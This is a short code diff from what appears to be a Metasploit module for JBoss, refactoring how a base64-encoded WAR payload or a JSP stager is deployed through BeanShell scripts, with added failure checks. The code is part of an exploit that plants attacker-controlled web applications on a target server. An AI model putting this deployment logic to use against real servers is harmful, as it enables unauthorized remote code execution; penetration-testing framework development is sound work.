@@ -58,11 +58,17 @@ class Metasploit3 < Msf::Auxiliary
       encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
 
       if datastore['VERB'] == 'POST' then
-        deploy_payload_bsh(encoded_payload, app_base)
+        bsh_payload = gen_payload_bsh(encoded_payload, app_base)
+        if !deploy_bsh(bsh_payload)
+          fail_with(Failure::Unknown, "Failed to deploy the WAR payload")
+        end
       else
         content_var = Rex::Text.rand_text_alpha(8+rand(8))
         # We need to deploy a stager first
-        deploy_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
+        bsh_payload = gen_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
+        if !deploy_bsh(bsh_payload)
+          fail_with(Failure::Unknown, "Failed to deploy the WAR payload")
+        end
 
         # now we call the stager to deploy our real payload war
         stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
